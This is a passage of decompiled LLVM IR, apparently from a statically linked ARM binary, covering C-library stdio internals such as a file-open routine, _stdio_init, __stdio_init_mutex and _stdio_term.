  br i1 %v2_12560, label %dec_label_pc_12550.dec_label_pc_12568_crit_edge, label %dec_label_pc_12498

dec_label_pc_12550.dec_label_pc_12568_crit_edge:  ; preds = %dec_label_pc_12550
  %v0_12568.pre = load i32, i32* @r6, align 4
  %v0_1256c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12568

dec_label_pc_12568:                               ; preds = %dec_label_pc_12550.dec_label_pc_12568_crit_edge, %dec_label_pc_12544
  %v0_1256c = phi i32 [ %v0_1256c.pre, %dec_label_pc_12550.dec_label_pc_12568_crit_edge ], [ %v0_12544, %dec_label_pc_12544 ]
  %v0_12568 = phi i32 [ %v0_12568.pre, %dec_label_pc_12550.dec_label_pc_12568_crit_edge ], [ %v1_12544, %dec_label_pc_12544 ]
  %v1_12568 = and i32 %v0_12568, 131072
  store i32 %v1_12568, i32* %r3.global-to-local, align 4
  %v2_1256c = or i32 %v1_12568, %v0_1256c
  store i32 %v2_1256c, i32* @r4, align 4
  br label %dec_label_pc_12598

dec_label_pc_12574:                               ; preds = %dec_label_pc_1251c
  %v7_12574 = icmp eq i32 %v0_12574, -1
  store i1 %v7_12574, i1* %cpsr_z.global-to-local, align 1
  %v0_12580.pre = load i32, i32* @r4, align 4
  br i1 %v7_12574, label %dec_label_pc_12574._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_12574
  %v2_12578 = or i32 %v0_12580.pre, ptrtoint ([134 x i8]* @global_var_20000.1013 to i32)
  store i32 %v2_12578, i32* @r4, align 4
  br label %dec_label_pc_12574._crit_edge

dec_label_pc_12574._crit_edge:                    ; preds = %dec_label_pc_12574, %bb34
  %v0_12580 = phi i32 [ %v2_12578, %bb34 ], [ %v0_12580.pre, %dec_label_pc_12574 ]
  %v0_1257c = load i32, i32* @r6, align 4
  store i32 %v0_1257c, i32* %r0.global-to-local, align 4
  store i32 %v0_12580, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_12588 = inttoptr i32 %v0_1257c to i8*
  %v3_12588 = call i32 @__libc_open(i8* %v2_12588, i32 %v0_12580)
  store i32 %v3_12588, i32* %r0.global-to-local, align 4
  %v1_1258c = icmp slt i32 %v3_12588, 0
  %v2_1258c = icmp eq i32 %v3_12588, 0
  store i1 %v2_1258c, i1* %cpsr_z.global-to-local, align 1
  %v1_12590 = load i32, i32* @r8, align 4
  %v2_12590 = add i32 %v1_12590, 4
  %v3_12590 = inttoptr i32 %v2_12590 to i32*
  store i32 %v3_12588, i32* %v3_12590, align 4
  br i1 %v1_1258c, label %dec_label_pc_124ac, label %dec_label_pc_12598

dec_label_pc_12598:                               ; preds = %dec_label_pc_12574._crit_edge, %dec_label_pc_12568
  %v0_12598 = load i32, i32* @r8, align 4
  %v1_12598 = inttoptr i32 %v0_12598 to i32*
  %v2_12598 = load i32, i32* %v1_12598, align 4
  %v1_1259c = and i32 %v2_12598, 8192
  store i32 %v1_1259c, i32* %r3.global-to-local, align 4
  %v3_125a01 = udiv i32 %v1_1259c, 256
  store i32 %v3_125a01, i32* %r2.global-to-local, align 4
  %v1_125a4 = trunc i32 %v3_125a01 to i8
  %v3_125a4 = add i32 %v0_12598, 1
  %v4_125a4 = inttoptr i32 %v3_125a4 to i8*
  store i8 %v1_125a4, i8* %v4_125a4, align 1
  %v0_125a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_125a8 = trunc i32 %v0_125a8 to i8
  %v2_125a8 = load i32, i32* @r8, align 4
  %v3_125a8 = inttoptr i32 %v2_125a8 to i8*
  store i8 %v1_125a8, i8* %v3_125a8, align 1
  %v0_125ac = load i32, i32* @r4, align 4
  %v1_125ac = and i32 %v0_125ac, ptrtoint ([134 x i8]* @global_var_20000.1013 to i32)
  store i32 %v1_125ac, i32* %r1.global-to-local, align 4
  %v2_125ac = icmp eq i32 %v1_125ac, 0
  store i1 %v2_125ac, i1* %cpsr_z.global-to-local, align 1
  %v0_125b0 = load i32, i32* @r8, align 4
  %v1_125b0 = add i32 %v0_125b0, 1
  %v2_125b0 = inttoptr i32 %v1_125b0 to i8*
  %v3_125b0 = load i8, i8* %v2_125b0, align 1
  %v4_125b0 = zext i8 %v3_125b0 to i32
  %v1_125b4 = inttoptr i32 %v0_125b0 to i8*
  %v2_125b4 = load i8, i8* %v1_125b4, align 1
  %v3_125b4 = zext i8 %v2_125b4 to i32
  store i32 %v3_125b4, i32* %r3.global-to-local, align 4
  br i1 %v2_125ac, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_12598
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_12598, %bb35
  %v0_125c8 = phi i32 [ 0, %dec_label_pc_12598 ], [ 32768, %bb35 ]
  %v1_125bc = and i32 %v0_125ac, 1024
  store i32 %v1_125bc, i32* %r0.global-to-local, align 4
  %v4_125c4 = mul nuw nsw i32 %v4_125b0, 256
  %v5_125c4 = or i32 %v3_125b4, %v4_125c4
  %v2_125c8 = or i32 %v0_125c8, %v1_125bc
  store i32 %v2_125c8, i32* %r1.global-to-local, align 4
  %v2_125d0 = or i32 %v5_125c4, %v2_125c8
  %v1_125c0 = mul i32 %v0_125ac, 16
  %v1_125cc = and i32 %v1_125c0, 48
  %v1_125d4 = add nuw nsw i32 %v1_125cc, 16
  %v4_125d8 = xor i32 %v1_125d4, 48
  %v5_125d8 = or i32 %v2_125d0, %v4_125d8
  store i32 %v5_125d8, i32* %r3.global-to-local, align 4
  %v3_125dc19 = udiv i32 %v2_125d0, 256
  store i32 %v3_125dc19, i32* %r2.global-to-local, align 4
  %v1_125e0 = trunc i32 %v3_125dc19 to i8
  store i8 %v1_125e0, i8* %v2_125b0, align 1
  %v0_125e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_125e4 = trunc i32 %v0_125e4 to i8
  %v2_125e4 = load i32, i32* @r8, align 4
  %v3_125e4 = inttoptr i32 %v2_125e4 to i8*
  store i8 %v1_125e4, i8* %v3_125e4, align 1
  %v0_125e8 = call i32 @__errno_location()
  store i32 %v0_125e8, i32* %r0.global-to-local, align 4
  %v0_125ec = load i32, i32* @r8, align 4
  %v1_125ec = add i32 %v0_125ec, 1
  %v2_125ec = inttoptr i32 %v1_125ec to i8*
  %v3_125ec = load i8, i8* %v2_125ec, align 1
  %v4_125ec = zext i8 %v3_125ec to i32
  store i32 %v4_125ec, i32* %r3.global-to-local, align 4
  %v1_125f0 = inttoptr i32 %v0_125ec to i8*
  %v2_125f0 = load i8, i8* %v1_125f0, align 1
  %v3_125f0 = zext i8 %v2_125f0 to i32
  store i32 %v0_125e8, i32* @r6, align 4
  %v1_125f8 = add i32 %v0_125ec, 4
  %v2_125f8 = inttoptr i32 %v1_125f8 to i32*
  %v3_125f8 = load i32, i32* %v2_125f8, align 4
  store i32 %v3_125f8, i32* @r0, align 4
  %v4_125fc = mul nuw nsw i32 %v4_125ec, 256
  %v5_125fc = or i32 %v3_125f0, %v4_125fc
  store i32 %v5_125fc, i32* @r4, align 4
  %v1_12600 = inttoptr i32 %v0_125e8 to i32*
  %v2_12600 = load i32, i32* %v1_12600, align 4
  store i32 %v2_12600, i32* @r5, align 4
  %v1_12604 = call i32 @isatty(i32 %v3_125f8)
  store i32 %v1_12604, i32* %r0.global-to-local, align 4
  %v0_12608 = load i32, i32* @r4, align 4
  %v4_12608 = mul i32 %v1_12604, 256
  %v5_12608 = or i32 %v0_12608, %v4_12608
  store i32 %v5_12608, i32* @r4, align 4
  %v3_1260c = sdiv i32 %v5_12608, 256
  store i32 %v3_1260c, i32* %r3.global-to-local, align 4
  %v1_12610 = trunc i32 %v3_1260c to i8
  %v2_12610 = load i32, i32* @r8, align 4
  %v3_12610 = add i32 %v2_12610, 1
  %v4_12610 = inttoptr i32 %v3_12610 to i8*
  store i8 %v1_12610, i8* %v4_12610, align 1
  %v0_12614 = load i32, i32* @r4, align 4
  %v1_12614 = trunc i32 %v0_12614 to i8
  %v2_12614 = load i32, i32* @r8, align 4
  %v3_12614 = inttoptr i32 %v2_12614 to i8*
  store i8 %v1_12614, i8* %v3_12614, align 1
  %v0_12618 = load i32, i32* @r5, align 4
  %v1_12618 = load i32, i32* @r6, align 4
  %v2_12618 = inttoptr i32 %v1_12618 to i32*
  store i32 %v0_12618, i32* %v2_12618, align 4
  %v0_1261c = load i32, i32* @r8, align 4
  %v1_1261c = add i32 %v0_1261c, 8
  %v2_1261c = inttoptr i32 %v1_1261c to i32*
  %v3_1261c = load i32, i32* %v2_1261c, align 4
  store i32 %v3_1261c, i32* %r3.global-to-local, align 4
  %v2_12620 = icmp eq i32 %v3_1261c, 0
  store i1 %v2_12620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12620, label %dec_label_pc_12628, label %bb37

dec_label_pc_12628:                               ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_1262c = call i32 @malloc(i32 4096)
  store i32 %v1_1262c, i32* %r0.global-to-local, align 4
  %v2_12630 = icmp eq i32 %v1_1262c, 0
  store i1 %v2_12630, i1* %cpsr_z.global-to-local, align 1
  %v1_12644.pre = load i32, i32* @r8, align 4
  br i1 %v2_12630, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_12628
  %v2_1264420 = add i32 %v1_12644.pre, 8
  %v3_1264421 = inttoptr i32 %v2_1264420 to i32*
  store i32 0, i32* %v3_1264421, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_12628
  %v2_12634 = inttoptr i32 %v1_12644.pre to i32*
  %v3_12634 = load i32, i32* %v2_12634, align 4
  %v2_12638 = or i32 %v3_12634, 16384
  store i32 %v2_12638, i32* %r3.global-to-local, align 4
  %v2_1263c = add i32 %v1_1262c, 4096
  store i32 %v2_1263c, i32* %r2.global-to-local, align 4
  %v4_12640 = sdiv i32 %v2_12638, 256
  store i32 %v4_12640, i32* %r1.global-to-local, align 4
  %v2_12644 = add i32 %v1_12644.pre, 8
  %v3_12644 = inttoptr i32 %v2_12644 to i32*
  store i32 %v1_1262c, i32* %v3_12644, align 4
  %v1_12648 = load i32, i32* %r2.global-to-local, align 4
  %v2_12648 = load i32, i32* @r8, align 4
  %v3_12648 = add i32 %v2_12648, 12
  %v4_12648 = inttoptr i32 %v3_12648 to i32*
  store i32 %v1_12648, i32* %v4_12648, align 4
  %v1_1264c = load i32, i32* %r1.global-to-local, align 4
  %v2_1264c = trunc i32 %v1_1264c to i8
  %v3_1264c = load i32, i32* @r8, align 4
  %v4_1264c = add i32 %v3_1264c, 1
  %v5_1264c = inttoptr i32 %v4_1264c to i8*
  store i8 %v2_1264c, i8* %v5_1264c, align 1
  %v0_12650.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12650.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_12650 = load i32, i32* %r3.global-to-local, align 4
  %v2_12650 = trunc i32 %v1_12650 to i8
  %v3_12650 = load i32, i32* @r8, align 4
  %v4_12650 = inttoptr i32 %v3_12650 to i8*
  store i8 %v2_12650, i8* %v4_12650, align 1
  %v0_12654.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12654.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_12654 = load i32, i32* @r8, align 4
  %v3_12654 = add i32 %v2_12654, 12
  %v4_12654 = inttoptr i32 %v3_12654 to i32*
  store i32 %v1_1262c, i32* %v4_12654, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c5e0.1016 to i32), i32* %r3.global-to-local, align 4
  %v2_12660 = load i32, i32* @r8, align 4
  %v3_12660 = add i32 %v2_12660, 2
  %v4_12660 = inttoptr i32 %v3_12660 to i8*
  store i8 0, i8* %v4_12660, align 1
  %v0_12664 = load i32, i32* @r8, align 4
  %v1_12664 = add i32 %v0_12664, 1
  %v2_12664 = inttoptr i32 %v1_12664 to i8*
  %v3_12664 = load i8, i8* %v2_12664, align 1
  %v4_12664 = zext i8 %v3_12664 to i32
  store i32 %v4_12664, i32* %r2.global-to-local, align 4
  %v2_12668 = load i32, i32* @global_var_2c5e0.1016, align 4
  store i32 %v2_12668, i32* %r1.global-to-local, align 4
  %v1_1266c = add i32 %v0_12664, 8
  %v2_1266c = inttoptr i32 %v1_1266c to i32*
  %v3_1266c = load i32, i32* %v2_1266c, align 4
  store i32 %v3_1266c, i32* %r3.global-to-local, align 4
  %v1_12670 = and i32 %v4_12664, 32
  %v2_12670 = icmp eq i32 %v1_12670, 0
  store i1 %v2_12670, i1* %cpsr_z.global-to-local, align 1
  %v2_12674 = add i32 %v0_12664, 20
  %v3_12674 = inttoptr i32 %v2_12674 to i32*
  store i32 %v3_1266c, i32* %v3_12674, align 4
  %v0_12678 = load i32, i32* %r0.global-to-local, align 4
  %v1_12678 = load i32, i32* @r8, align 4
  %v2_12678 = add i32 %v1_12678, 44
  %v3_12678 = inttoptr i32 %v2_12678 to i32*
  store i32 %v0_12678, i32* %v3_12678, align 4
  %v0_1267c = load i32, i32* %r1.global-to-local, align 4
  %v1_1267c = load i32, i32* @r8, align 4
  %v2_1267c = add i32 %v1_1267c, 52
  %v3_1267c = inttoptr i32 %v2_1267c to i32*
  store i32 %v0_1267c, i32* %v3_1267c, align 4
  %v0_12680 = load i32, i32* %r3.global-to-local, align 4
  %v1_12680 = load i32, i32* @r8, align 4
  %v2_12680 = add i32 %v1_12680, 24
  %v3_12680 = inttoptr i32 %v2_12680 to i32*
  store i32 %v0_12680, i32* %v3_12680, align 4
  %v0_12684 = load i32, i32* %r3.global-to-local, align 4
  %v1_12684 = load i32, i32* @r8, align 4
  %v2_12684 = add i32 %v1_12684, 28
  %v3_12684 = inttoptr i32 %v2_12684 to i32*
  store i32 %v0_12684, i32* %v3_12684, align 4
  %v0_12688 = load i32, i32* %r3.global-to-local, align 4
  %v1_12688 = load i32, i32* @r8, align 4
  %v2_12688 = add i32 %v1_12688, 16
  %v3_12688 = inttoptr i32 %v2_12688 to i32*
  store i32 %v0_12688, i32* %v3_12688, align 4
  br i1 %v2_12670, label %dec_label_pc_1271c, label %dec_label_pc_12690

dec_label_pc_12690:                               ; preds = %bb37
  %v2_12690 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_12690, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_15fd4.997 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c5c8.1001 to i32), i32* %r2.global-to-local, align 4
  %v1_126a8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2c5c8.1001 to i32), i32* %r0.global-to-local, align 4
  %v1_126b8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_2c5b0.1022 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_1246c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_15fd4.997 to i32), i32* %r1.global-to-local, align 4
  %v1_126cc = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2c5b0.1022 to i32), i32* %r0.global-to-local, align 4
  %v1_126d8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_2c5ac.1025 to i32), i32* %r2.global-to-local, align 4
  %v2_126e0 = load i32, i32* bitcast (i32** @global_var_2c5ac.1025 to i32*), align 4
  store i32 %v2_126e0, i32* %r3.global-to-local, align 4
  store i32 %v2_1246c, i32* @r0, align 4
  %v1_126e8 = load i32, i32* @r8, align 4
  %v2_126e8 = add i32 %v1_126e8, 32
  %v3_126e8 = inttoptr i32 %v2_126e8 to i32*
  store i32 %v2_126e0, i32* %v3_126e8, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_126f4 = load i32, i32* @r8, align 4
  %v1_126f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_126f4 = inttoptr i32 %v1_126f4 to i32*
  store i32 %v0_126f4, i32* %v2_126f4, align 4
  %v1_126fc = call i32 @__pthread_return_void()
  store i32 %v2_12690, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 75540, i32* @lr, align 4
  %v1_12710 = call i32 @__pthread_return_void()
  store i32 %v1_12710, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1271c

dec_label_pc_12718:                               ; preds = %dec_label_pc_124ac, %dec_label_pc_12498, %dec_label_pc_124b8
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_1271c

dec_label_pc_1271c:                               ; preds = %bb37, %dec_label_pc_124f0, %dec_label_pc_12690, %dec_label_pc_12718
  %v0_1271c = load i32, i32* @r8, align 4
  store i32 %v0_1271c, i32* %r0.global-to-local, align 4
  %v2_12724 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12724, i32* @r4, align 4
  store i32 %v6_12460, i32* @r5, align 4
  store i32 %v9_12460, i32* @r6, align 4
  store i32 %v15_12460, i32* @r8, align 4
  ret i32 %v0_1271c

; uselistorder directives
  uselistorder i32 %v1_12644.pre, { 1, 0, 2 }
  uselistorder i32 %v3_1260c, { 1, 0 }
  uselistorder i32 %v3_125a01, { 1, 0 }
  uselistorder i32 %v0_12580, { 1, 0 }
  uselistorder i1 %v7_12574, { 1, 0 }
  uselistorder i32 %v1_12544, { 1, 0 }
  uselistorder i32 %v0_12544, { 1, 0 }
  uselistorder i32 %v1_1252c, { 1, 0, 2 }
  uselistorder i32 %v1_124e0, { 1, 0 }
  uselistorder i1 %v7_1248c, { 1, 0 }
  uselistorder i1 %v7_12480, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 7, 6, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 18, 19 }
  uselistorder i32 16384, { 18, 4, 11, 5, 12, 6, 13, 2, 14, 3, 15, 0, 16, 1, 17, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_1271c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_12718, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_12574._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1251c, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_124c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12498, { 1, 2, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12728:
  %v0_12728 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12728, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12728
  %v5_12728 = sdiv i32 %arg2, 16
  %v6_12728 = and i32 %v5_12728, %arg1
  %v5_1272c = sdiv i32 %arg2, 256
  %v6_1272c = and i32 %v6_12728, %v5_1272c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12728, %bb
  %v7_1272c = phi i32 [ %arg1, %dec_label_pc_12728 ], [ %v6_1272c, %bb ]
  ret i32 %v7_1272c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12758 = load i32, i32* @r4, align 4
  store i32 %v3_12758, i32* %stack_var_-24, align 4
  %v9_12758 = load i32, i32* @r6, align 4
  %v0_1275c = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_2c5e4.990 to i32), i32* @r4, align 4
  %v3_12764 = load i8, i8* @global_var_2c5e5.1028, align 1
  %v4_12764 = zext i8 %v3_12764 to i32
  %v2_12768 = load i8, i8* bitcast (i8** @global_var_2c5e4.990 to i8*), align 4
  %v3_12768 = zext i8 %v2_12768 to i32
  store i32 %v0_1275c, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_12774 = mul nuw nsw i32 %v4_12764, 256
  %v5_12774 = or i32 %v3_12768, %v4_12774
  store i32 %v5_12774, i32* @r6, align 4
  %v1_12778 = inttoptr i32 %v0_1275c to i32*
  %v2_12778 = load i32, i32* %v1_12778, align 4
  store i32 %v2_12778, i32* %r8.global-to-local, align 4
  %v1_1277c = call i32 @isatty(i32 0)
  %v1_12780 = sub i32 1, %v1_1277c
  %v0_12784 = load i32, i32* @r6, align 4
  %v4_12784 = mul i32 %v1_12780, 256
  %v5_12784 = xor i32 %v4_12784, %v0_12784
  %v3_12788 = load i8, i8* @global_var_2c635.1029, align 1
  %v4_12788 = zext i8 %v3_12788 to i32
  %v3_1278c = load i8, i8* @global_var_2c634.991, align 1
  %v4_1278c = zext i8 %v3_1278c to i32
  %v3_12790 = sdiv i32 %v5_12784, 256
  store i32 1, i32* @r0, align 4
  %v4_12798 = mul nuw nsw i32 %v4_12788, 256
  %v5_12798 = or i32 %v4_1278c, %v4_12798
  store i32 %v5_12798, i32* @r5, align 4
  %v1_1279c = trunc i32 %v3_12790 to i8
  store i8 %v1_1279c, i8* @global_var_2c5e5.1028, align 1
  %v1_127a0 = trunc i32 %v0_12784 to i8
  %v2_127a0 = load i32, i32* @r4, align 4
  %v3_127a0 = inttoptr i32 %v2_127a0 to i8*
  store i8 %v1_127a0, i8* %v3_127a0, align 1
  %v1_127a4 = call i32 @isatty(i32 1)
  %v1_127a8 = sub i32 1, %v1_127a4
  %v0_127ac = load i32, i32* @r5, align 4
  %v4_127ac = mul i32 %v1_127a8, 256
  %v5_127ac = xor i32 %v4_127ac, %v0_127ac
  store i32 %v5_127ac, i32* %r5.global-to-local, align 4
  %v3_127b0 = sdiv i32 %v5_127ac, 256
  %v1_127b4 = trunc i32 %v3_127b0 to i8
  store i8 %v1_127b4, i8* @global_var_2c635.1029, align 1
  %v0_127b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_127b8 = load i32, i32* @r7, align 4
  %v2_127b8 = inttoptr i32 %v1_127b8 to i32*
  store i32 %v0_127b8, i32* %v2_127b8, align 4
  %v0_127bc = load i32, i32* %r5.global-to-local, align 4
  %v1_127bc = trunc i32 %v0_127bc to i8
  store i8 %v1_127bc, i8* @global_var_2c634.991, align 1
  %v2_127c0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_127c0, i32* @r4, align 4
  store i32 %v9_12758, i32* @r6, align 4
  ret i32 %v1_127a8

; uselistorder directives
  uselistorder i32 %v1_127a8, { 1, 0 }
  uselistorder i32 %v0_12784, { 1, 0 }
  uselistorder i8* @global_var_2c634.991, { 1, 0 }
  uselistorder i8* @global_var_2c635.1029, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder i8* @global_var_2c5e5.1028, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_23298.1031 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_127d0 = call i32 @memcpy()
  %v0_127d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_127d4, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_127d0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_127d8 = load i32, i32* @r4, align 4
  store i32 %v3_127d8, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2c5b0.1022 to i32), i32* @r0, align 4
  %v0_127e0 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_2c5c8.1001 to i32), i32* @r0, align 4
  %v0_127e8 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_2c5ac.1025 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_2c5ac.1025 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_128446 = add i32 %storemerge5, 56
  store i32 %v1_128446, i32* @r5, align 4
  %v2_128488 = icmp eq i32 %storemerge5, 0
  store i32 %v1_128446, i32* %r0.global-to-local, align 4
  br i1 %v2_128488, label %dec_label_pc_12854, label %dec_label_pc_127f8

dec_label_pc_127f8:                               ; preds = %entry, %dec_label_pc_12834
  store i32 ptrtoint (i8* @global_var_15fd4.997 to i32), i32* %r3.global-to-local, align 4
  store i32 75780, i32* @lr, align 4
  %v1_12800 = call i32 @__pthread_return_0()
  %v2_12804 = icmp eq i32 %v1_12800, 0
  %v0_12808 = load i32, i32* @r5, align 4
  store i32 %v0_12808, i32* @r0, align 4
  br i1 %v2_12804, label %dec_label_pc_12834, label %dec_label_pc_12810

dec_label_pc_12810:                               ; preds = %dec_label_pc_127f8
  %v0_12810 = load i32, i32* @r4, align 4
  %v1_12810 = add i32 %v0_12810, 8
  %v2_12810 = inttoptr i32 %v1_12810 to i32*
  %v3_12810 = load i32, i32* %v2_12810, align 4
  store i32 %v3_12810, i32* %r3.global-to-local, align 4
  %v3_12818 = inttoptr i32 %v0_12810 to i8*
  store i8 48, i8* %v3_12818, align 1
  %v2_12820 = load i32, i32* @r4, align 4
  %v3_12820 = add i32 %v2_12820, 1
  %v4_12820 = inttoptr i32 %v3_12820 to i8*
  store i8 0, i8* %v4_12820, align 1
  %v0_12824 = load i32, i32* %r3.global-to-local, align 4
  %v1_12824 = load i32, i32* @r4, align 4
  %v2_12824 = add i32 %v1_12824, 20
  %v3_12824 = inttoptr i32 %v2_12824 to i32*
  store i32 %v0_12824, i32* %v3_12824, align 4
  %v0_12828 = load i32, i32* %r3.global-to-local, align 4
  %v1_12828 = load i32, i32* @r4, align 4
  %v2_12828 = add i32 %v1_12828, 24
  %v3_12828 = inttoptr i32 %v2_12828 to i32*
  store i32 %v0_12828, i32* %v3_12828, align 4
  %v0_1282c = load i32, i32* %r3.global-to-local, align 4
  %v1_1282c = load i32, i32* @r4, align 4
  %v2_1282c = add i32 %v1_1282c, 28
  %v3_1282c = inttoptr i32 %v2_1282c to i32*
  store i32 %v0_1282c, i32* %v3_1282c, align 4
  %v0_12830 = load i32, i32* %r3.global-to-local, align 4
  %v1_12830 = load i32, i32* @r4, align 4
  %v2_12830 = add i32 %v1_12830, 16
  %v3_12830 = inttoptr i32 %v2_12830 to i32*
  store i32 %v0_12830, i32* %v3_12830, align 4
  br label %dec_label_pc_12834

dec_label_pc_12834:                               ; preds = %dec_label_pc_127f8, %dec_label_pc_12810
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_12838 = load i32, i32* @r4, align 4
  %v2_12838 = add i32 %v1_12838, 52
  %v3_12838 = inttoptr i32 %v2_12838 to i32*
  store i32 1, i32* %v3_12838, align 4
  %v0_1283c = call i32 @__stdio_init_mutex()
  store i32 %v0_1283c, i32* %r0.global-to-local, align 4
  %v0_12840 = load i32, i32* @r4, align 4
  %v1_12840 = add i32 %v0_12840, 32
  %v2_12840 = inttoptr i32 %v1_12840 to i32*
  %storemerge = load i32, i32* %v2_12840, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_12844 = add i32 %storemerge, 56
  store i32 %v1_12844, i32* @r5, align 4
  %v2_12848 = icmp eq i32 %storemerge, 0
  store i32 %v1_12844, i32* %r0.global-to-local, align 4
  br i1 %v2_12848, label %dec_label_pc_12844.dec_label_pc_12854_crit_edge, label %dec_label_pc_127f8

dec_label_pc_12844.dec_label_pc_12854_crit_edge:  ; preds = %dec_label_pc_12834
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_2c5ac.1025 to i32*), align 4
  br label %dec_label_pc_12854

dec_label_pc_12854:                               ; preds = %dec_label_pc_12844.dec_label_pc_12854_crit_edge, %entry
  %v11_1287c13 = phi i32 [ %v1_12844, %dec_label_pc_12844.dec_label_pc_12854_crit_edge ], [ %v1_128446, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_12844.dec_label_pc_12854_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_2c5ac.1025 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_128744 = icmp eq i32 %storemerge12, 0
  br i1 %v2_128744, label %dec_label_pc_1287c, label %dec_label_pc_12860

dec_label_pc_12860:                               ; preds = %dec_label_pc_12854, %dec_label_pc_12860
  %v0_12868 = phi i32 [ %storemerge1, %dec_label_pc_12860 ], [ %storemerge12, %dec_label_pc_12854 ]
  %v1_12860 = inttoptr i32 %v0_12868 to i8*
  %v2_12860 = load i8, i8* %v1_12860, align 1
  %v3_12860 = zext i8 %v2_12860 to i32
  store i32 %v3_12860, i32* %r3.global-to-local, align 4
  %v1_12864 = and i32 %v3_12860, 64
  store i32 %v0_12868, i32* %r0.global-to-local, align 4
  store i32 75888, i32* @lr, align 4
  %v1_1286c = icmp ne i32 %v1_12864, 0
  call void @__pseudo_cond_branch(i1 %v1_1286c, i32 ptrtoint (i32* @global_var_12890.1036 to i32))
  %v0_12870 = load i32, i32* %r4.global-to-local, align 4
  %v1_12870 = add i32 %v0_12870, 32
  %v2_12870 = inttoptr i32 %v1_12870 to i32*
  %storemerge1 = load i32, i32* %v2_12870, align 4
